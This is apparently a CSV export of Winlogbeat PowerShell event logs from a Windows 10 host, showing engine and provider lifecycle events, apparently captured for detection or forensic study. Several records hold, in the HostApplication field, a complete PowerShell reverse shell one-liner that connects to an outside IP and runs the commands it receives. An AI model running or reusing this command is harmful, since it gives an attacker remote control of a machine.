"Oct 23, 2022 @ 17:06:17.506",LnkXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=0094b64e-3727-4d00-96ec-4e2c07d9ef14
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=5.1.19041.1682
	RunspaceId=0094b64e-3727-4d00-96ec-4e2c07d9ef14
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6215,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:17.490",KHkXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6209,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:17.490",KXkXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6210,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:17.490",KnkXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6211,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:17.490",K3kXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6212,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:17.490",LHkXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6213,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:17.490",LXkXBIQByII7dpeExS3t,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:17.999","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=38070505-5b22-4cd9-9a56-ffee605b8330
	HostApplication=powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('20.248.172.247',68);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6214,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.793",JHkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=edd804e6-ded4-4a01-8d45-928d107fd4b7
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=edd804e6-ded4-4a01-8d45-928d107fd4b7
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6208,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.728",HnkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6202,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.728",H3kXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6203,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.728",IHkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
